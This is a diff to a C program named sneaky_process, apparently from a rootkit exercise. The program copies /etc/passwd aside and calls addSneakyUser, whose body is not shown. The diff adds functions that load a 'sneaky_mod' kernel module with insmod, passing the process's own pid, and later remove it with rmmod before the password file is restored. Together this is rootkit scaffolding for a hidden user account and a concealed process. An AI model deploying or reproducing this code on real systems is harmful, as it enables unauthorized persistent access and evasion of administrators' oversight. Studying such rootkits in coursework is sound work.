@@ -1,6 +1,7 @@
 #include<stdio.h>
 #include<stdlib.h>
 
+
 void copyfile(char source_path[256], char destination_path[256]){
   FILE *source, *destination;
   char ch;
@@ -36,12 +37,29 @@ void addSneakyUser(){
   fclose(fp);
 }
 
+
+void loadSneakyModule(int pid){
+  char command[50];
+  sprintf(command, "insmod sneaky_mod.ko pid=%d", pid);
+  system(command);
+  printf("Sneaky Module loaded");
+} 
+
+
+void unLoadingSneakyModule(){
+  char command[] = "rmmod sneaky_mod";
+  system(command);
+  printf("Sneaky Module unloaded");
+
+}
+
 int main(int argc, char* argv[]){
   int current_pid = getpid();
   printf("sneaky_process pid = %d\n", current_pid);
   copyfile("/etc/passwd", "/tmp/passwd");
   addSneakyUser();
-
+  printf("Loading Sneaky user\n");
+  loadSneakyModule(current_pid);
   while(1){
     char input;
     scanf("%c", &input);
@@ -50,6 +68,7 @@ int main(int argc, char* argv[]){
     }
   }
 
+  unLoadingSneakyModule();
   copyfile("/tmp/passwd", "/etc/passwd");
     
   return 0;
